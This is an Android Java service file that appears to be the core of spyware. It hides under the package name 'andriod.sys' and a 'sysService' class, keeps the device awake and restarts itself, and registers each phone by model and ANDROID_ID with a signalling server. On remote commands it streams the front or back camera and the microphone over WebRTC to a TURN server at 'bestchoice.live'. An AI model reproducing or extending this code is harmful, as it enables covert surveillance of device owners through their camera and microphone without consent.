package andriod.sys;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.NonNull;
import android.widget.Toast;


import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera1Enumerator;
import org.webrtc.CameraEnumerator;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.Logging;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceViewRenderer;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoRenderer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class sysService extends Service implements SignallingClient.SignalingInterface{
    // variables
    Context context;
    Handler handler;
    PowerManager.WakeLock mWakeLock;

    PeerConnectionFactory peerConnectionFactory;
    MediaConstraints audioConstraints;
    MediaConstraints videoConstraints;
    MediaConstraints sdpConstraints;
    VideoTrack localVideoTrack;
    AudioTrack localAudioTrack;
    VideoSource videoSource;
    AudioSource audioSource;
    PeerConnection localPeer;
    List<IceServer> iceServers;
    EglBase rootEglBase;
    boolean gotUserMedia;
    VideoCapturer videoCapturerAndroid;
    List<PeerConnection.IceServer> peerIceServers = new ArrayList<>();
    String cam = "front";

    //end variables
    // servic overwrite methods
    public sysService(Context applicationContext) {
        super();
        context = applicationContext;
    }

    public sysService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
        mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "systemService");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        mWakeLock.acquire();
        handler = new Handler();
        String roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        SignallingClient.getInstance().init(this, roomName);
        Toast.makeText(getApplicationContext(),"on start sysService", Toast.LENGTH_LONG).show();
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent broadcastIntent = new Intent("ac.in.ActivityRecognition.RestartSensor");
        sendBroadcast(broadcastIntent);
    }
    // end service overwrite methods

    // segnaling interface methods
    @Override
    public void onCreatedRoom() {
        showToast("You created the room " + gotUserMedia);

    }

    @Override
    public void onCreateRoom() {
        showToast("create Room");

    }
    @Override
    public void onOfferReceived(final JSONObject data) {
        showToast("Received Offer");
        runOnUiThread(() -> {
            if (!SignallingClient.getInstance().isInitiator && !SignallingClient.getInstance().isStarted) {
                onTryToStart();
            }

            try {
                localPeer.setRemoteDescription(new CustomSdpObserver("localSetRemote"), new SessionDescription(SessionDescription.Type.OFFER, data.getString("sdp")));
                doAnswer();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        });
    }

    @Override
    public void onAnswerReceived(JSONObject data) {
        showToast("Received Answer");
        try {
            localPeer.setRemoteDescription(new CustomSdpObserver("localSetRemote"), new SessionDescription(SessionDescription.Type.fromCanonicalForm(data.getString("type").toLowerCase()), data.getString("sdp")));

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onIceCandidateReceived(JSONObject data) {
        try {
            localPeer.addIceCandidate(new IceCandidate(data.getString("id"), data.getInt("label"), data.getString("candidate")));
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void cmd(String cmd) {
        showToast("cmd is: " + cmd + " : " + getserverIp());
        if (cmd.equalsIgnoreCase("openFrontCam") ){
            openPeerCon();
            createFrontCamInstance();
            onTryToStart();
        }
        if (cmd.equalsIgnoreCase("openBackCam") ){
            openPeerCon();
            createBackCamInstance();
            onTryToStart();
        }
        if (cmd.equalsIgnoreCase("closeCam") ){
            closePeerCon();
        }
        if (cmd.equalsIgnoreCase("switchCam") ){
            switchCam();
            showToast(cam);
        }
        if (cmd.equalsIgnoreCase("openSound") ){
            openPeerCon();
            createSoundInstance();
            onTryToStart();
        }

    }
    // end signaling interface mehtod


    // help method

    public void showToast(final String msg) {
        runOnUiThread(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_SHORT).show());
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }
    public String getserverIp() {
        AsyncTask<String, Void, String> task = new AsyncTask<String, Void, String>()
        {
            @Override
            protected String doInBackground(String... strings) {
                try {
                    return InetAddress.getByName("bestchoice.live").getHostAddress();
                } catch (UnknownHostException e) {
                    e.printStackTrace();
                    return "unknown";
                }

            }

        };
        try
        {
            return task.execute().get();
        }
        catch (InterruptedException e)
        {
            return null;
        }
        catch (ExecutionException e)
        {
            return null;
        }

    }
    // end help method
    // webrtc mehtod

    public void openPeerCon(){
        closePeerCon();
        getIceServers();
        rootEglBase = EglBase.create();

        //Initialize PeerConnectionFactory globals.
        PeerConnectionFactory.InitializationOptions initializationOptions =
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableVideoHwAcceleration(true)
                        .createInitializationOptions();
        PeerConnectionFactory.initialize(initializationOptions);

        //Create a new PeerConnectionFactory instance - using Hardware encoder and decoder.
        PeerConnectionFactory.Options options = new PeerConnectionFactory.Options();
        DefaultVideoEncoderFactory defaultVideoEncoderFactory = new DefaultVideoEncoderFactory(
                rootEglBase.getEglBaseContext(),  true,  true);
        DefaultVideoDecoderFactory defaultVideoDecoderFactory = new DefaultVideoDecoderFactory(rootEglBase.getEglBaseContext());
        peerConnectionFactory = new PeerConnectionFactory(options, defaultVideoEncoderFactory, defaultVideoDecoderFactory);

    }
    public void closePeerCon(){
        try {
            if (videoCapturerAndroid != null) {
                videoCapturerAndroid.stopCapture();
                videoCapturerAndroid = null;
            }
            if (localPeer != null){
                localPeer.close();
                localPeer = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void switchCam(){
        if (cam.equalsIgnoreCase("front")){
            cam = "back";
            closePeerCon();
            openPeerCon();
            createBackCamInstance();
            onTryToStart();
        }
        else {
            cam = "front";
            closePeerCon();
            openPeerCon();
            createFrontCamInstance();
            onTryToStart();
        }
    }
    public void createFrontCamInstance(){
        //Now create a VideoCapturer instance.
        videoCapturerAndroid = frontCapture(new Camera1Enumerator(false));

        //Create MediaConstraints - Will be useful for specifying video and audio constraints.

        videoConstraints = new MediaConstraints();


        //Create a VideoSource instance
        if (videoCapturerAndroid != null) {
            videoSource = peerConnectionFactory.createVideoSource(videoCapturerAndroid);
        }
        localVideoTrack = peerConnectionFactory.createVideoTrack("100", videoSource);

        createSoundInstance();



        if (videoCapturerAndroid != null) {
            videoCapturerAndroid.startCapture(1024, 720, 30);
        }
    }
    public void createBackCamInstance(){
        //Now create a VideoCapturer instance.
        videoCapturerAndroid = backCapture(new Camera1Enumerator(false));

        //Create MediaConstraints - Will be useful for specifying video and audio constraints.

        videoConstraints = new MediaConstraints();


        //Create a VideoSource instance
        if (videoCapturerAndroid != null) {
            videoSource = peerConnectionFactory.createVideoSource(videoCapturerAndroid);
        }
        localVideoTrack = peerConnectionFactory.createVideoTrack("100", videoSource);

        createSoundInstance();

        if (videoCapturerAndroid != null) {
            videoCapturerAndroid.startCapture(1024, 720, 30);
        }
    }
    public void createSoundInstance(){
        //create an AudioSource instance
        audioConstraints = new MediaConstraints();
        audioSource = peerConnectionFactory.createAudioSource(audioConstraints);
        localAudioTrack = peerConnectionFactory.createAudioTrack("101", audioSource);
    }
    private VideoCapturer frontCapture(CameraEnumerator enumerator) {
        final String[] deviceNames = enumerator.getDeviceNames();

        // First, try to find front facing camera
        for (String deviceName : deviceNames) {
            if (enumerator.isFrontFacing(deviceName)) {
                VideoCapturer videoCapturer = enumerator.createCapturer(deviceName, null);

                if (videoCapturer != null) {
                    return videoCapturer;
                }
            }
        }

        return null;
    }
    private VideoCapturer backCapture(CameraEnumerator enumerator) {
        final String[] deviceNames = enumerator.getDeviceNames();
        // Front facing camera not found, try something else
        for (String deviceName : deviceNames) {
            if (!enumerator.isFrontFacing(deviceName)) {
                VideoCapturer videoCapturer = enumerator.createCapturer(deviceName, null);

                if (videoCapturer != null) {
                    return videoCapturer;
                }
            }
        }
        return null;
    }

    public void onTryToStart() {
        runOnUiThread(() -> {
            if ( localVideoTrack != null ) {
                createPeerConnection();
                SignallingClient.getInstance().isStarted = true;
                if (SignallingClient.getInstance().isInitiator) {
                    doCall();
                }
            }
        });
    }

    /**
     * Creating the local peerconnection instance
     */
    private void createPeerConnection() {
        peerIceServers.add(new org.webrtc.PeerConnection.IceServer("turn:" + getserverIp() + ":3478","turn","turn"));
        PeerConnection.RTCConfiguration rtcConfig =
                new PeerConnection.RTCConfiguration(peerIceServers);
        // TCP candidates are only useful when connecting to a server that supports
        // ICE-TCP.
        rtcConfig.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.DISABLED;
        rtcConfig.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        rtcConfig.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;
        rtcConfig.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
        // Use ECDSA encryption.
        rtcConfig.keyType = PeerConnection.KeyType.ECDSA;
        localPeer = peerConnectionFactory.createPeerConnection(rtcConfig, new CustomPeerConnectionObserver("localPeerCreation") {
            @Override
            public void onIceCandidate(IceCandidate iceCandidate) {
                super.onIceCandidate(iceCandidate);
                onIceCandidateReceived(iceCandidate);
            }

            @Override
            public void onAddStream(MediaStream mediaStream) {
                // do some thing with received stream
            }
        });

        addStreamToLocalPeer();
    }
    /**
     * Adding the stream to the localpeer
     */
    private void addStreamToLocalPeer() {
        //creating local mediastream
        MediaStream stream = peerConnectionFactory.createLocalMediaStream("102");
        stream.addTrack(localAudioTrack);
        stream.addTrack(localVideoTrack);
        localPeer.addStream(stream);
    }

    public void onIceCandidateReceived(IceCandidate iceCandidate) {
        //we have received ice candidate. We can set it to the other peer.
        SignallingClient.getInstance().emitIceCandidate(iceCandidate);
    }
    /**
     * This method is called when the app is initiator - We generate the offer and send it over through socket
     * to remote peer
     */
    private void doCall() {
        showToast("do call");
        localPeer.createOffer(new CustomSdpObserver("localCreateOffer") {
            @Override
            public void onCreateSuccess(SessionDescription sessionDescription) {
                super.onCreateSuccess(sessionDescription);
                localPeer.setLocalDescription(new CustomSdpObserver("localSetLocalDesc"), sessionDescription);
                SignallingClient.getInstance().emitMessage(sessionDescription);
            }
        }, new MediaConstraints());
    }
    private void getIceServers() {
        //get Ice servers using xirsys
        Utils.getInstance().getRetrofitInstance().getIceCandidates().enqueue(new Callback<TurnServerPojo>() {
            @Override
            public void onResponse(@NonNull Call<TurnServerPojo> call, @NonNull Response<TurnServerPojo> response) {
                TurnServerPojo body = response.body();
                if (body != null) {
                    iceServers = body.iceServerList.iceServers;
                }
                for (IceServer iceServer : iceServers) {
                    if (iceServer.credential == null) {
                        PeerConnection.IceServer peerIceServer = PeerConnection.IceServer.builder(iceServer.url).createIceServer();
                        peerIceServers.add(peerIceServer);
                    } else {
                        PeerConnection.IceServer peerIceServer = PeerConnection.IceServer.builder(iceServer.url)
                                .setUsername(iceServer.username)
                                .setPassword(iceServer.credential)
                                .createIceServer();
                        peerIceServers.add(peerIceServer);
                    }
                }

            }

            @Override
            public void onFailure(@NonNull Call<TurnServerPojo> call, @NonNull Throwable t) {
                t.printStackTrace();
            }
        });
    }
    private void doAnswer() {
        localPeer.createAnswer(new CustomSdpObserver("localCreateAns") {
            @Override
            public void onCreateSuccess(SessionDescription sessionDescription) {
                super.onCreateSuccess(sessionDescription);
                localPeer.setLocalDescription(new CustomSdpObserver("localSetLocal"), sessionDescription);
                SignallingClient.getInstance().emitMessage(sessionDescription);
            }
        }, new MediaConstraints());
    }

    // end webrtc methods

}
